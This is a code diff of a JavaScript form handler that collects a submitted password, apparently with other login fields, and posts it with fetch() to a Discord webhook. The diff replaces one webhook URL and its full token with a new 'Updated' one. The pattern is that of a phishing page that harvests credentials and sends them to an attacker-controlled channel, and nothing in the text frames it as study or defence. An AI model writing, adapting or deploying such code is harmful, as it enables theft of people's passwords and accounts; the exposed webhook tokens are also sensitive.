@@ -10,8 +10,8 @@ document.querySelector('form').addEventListener('submit', function(event) {
     password: password
   };
 
-  // Discord Webhook URL
-  var webhookURL = 'https://discord.com/api/webhooks/1470109902432370698/HD8rAVEc-NQy0pgkwwo__Zy5TrShEHqs3ZQPjwM-RHX-I99auXDn0Jw5vGe-v2-eHGUi';
+  // New Discord Webhook URL (Updated)
+  var webhookURL = 'https://discord.com/api/webhooks/1470143004546175110/oGWlC1OPcNzVOaZYJZVNhrp2-ZYlMaHtIt-wdoMJXG2b1UFN0z6Fa51y5M5NpughhnXH';
 
   // Send the data to the Discord webhook
   fetch(webhookURL, {
